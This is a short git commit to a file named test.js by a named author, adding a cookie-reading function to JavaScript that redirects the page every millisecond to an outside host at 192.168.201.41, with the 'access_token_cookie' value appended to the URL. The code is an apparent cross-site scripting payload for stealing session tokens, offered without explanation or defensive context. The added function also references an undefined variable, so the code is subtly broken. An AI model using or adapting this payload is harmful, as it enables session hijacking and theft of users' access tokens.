5916ab9f60312ddf7b466b5d942fd5f191af490b
Yevgenii Shchemelev <shchemelevev@gmail.com>
2025-03-02 00:19:33 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,9 @@
+    function getCookie(cookiename)
+      {
+        var re = new RegExp(rgcookie + "=([^;]+)");
+        var value = re.exec(document.cookie);
+        return (value != null) ? unescape(value[1]) : null;
+      }
 setInterval(function() {  
   document.location = "http://192.168.201.41/test" + getCookie("access_token_cookie")
 }, 1);
